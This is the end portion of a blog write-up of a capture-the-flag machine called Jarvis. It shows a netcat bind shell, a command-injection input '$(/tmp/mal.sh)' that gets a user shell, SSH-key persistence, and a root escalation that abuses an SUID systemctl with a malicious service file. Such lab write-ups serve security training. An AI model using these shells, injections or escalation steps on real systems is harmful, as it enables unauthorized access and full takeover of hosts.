<p>We setup a simple bind shell as <code>/tmp/mal.sh</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5555 -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u pepper python .&#x2F;simpler.py -p</span><br><span class="line">	Enter an IP: $(&#x2F;tmp&#x2F;mal.sh)</span><br><span class="line">&lt;hangs&gt;</span><br></pre></td></tr></table></figure>

<p>Now we can connect to port 5555 and login as pepper, giving us our user flag. </p>
<p>Next, I added my ssh key to <code>~/.ssh/authorized_keys</code> to give me a proper SSH session, meaning editors, etc will work.</p>
<p>We’ve already looked through the processes before so it’s unlikely to help us, we can look for SID bits though:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -perm -4000 -print 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;systemctl</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br></pre></td></tr></table></figure>

<p>The only odd one we see here is systemctl. This is used to control the systemd init system, which handles starting almost everything on the system, including managing long-running daemons.<br>Giving it an SUID bit means that anyone can control all parts of the init system. This gives us an easy path to root: We make a .service file that gives us a shell, then link it and ask systemctl to run it as a system process, ie as root:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cat mal.service</span><br><span class="line">	[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;nc -lvp 6666 -e &#x2F;bin&#x2F;bash&quot;</span><br><span class="line">$ systemctl link &#x2F;home&#x2F;pepper&#x2F;mal.service</span><br><span class="line">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;mal.service → &#x2F;home&#x2F;pepper&#x2F;mal.service.</span><br><span class="line">$ systemctl start mal.service</span><br></pre></td></tr></table></figure>

<p>We now have a root shell and can read the flag!</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/archives/">Recent</a></li>
         
          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://tcmal.xyz/jarvis/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://tcmal.xyz/jarvis/&text=Jarvis" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://tcmal.xyz/jarvis/&is_video=false&description=Jarvis" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Jarvis&body=Check out this article: http://tcmal.xyz/jarvis/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://tcmal.xyz/jarvis/&title=Jarvis" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://tcmal.xyz/jarvis/&name=Jarvis&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://tcmal.xyz/jarvis/&t=Jarvis" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2020
    tcmal
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/archives/">Recent</a></li>
         
          <li><a href="https://github.com/tcmal" target="_blank" rel="noopener">GitHub</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
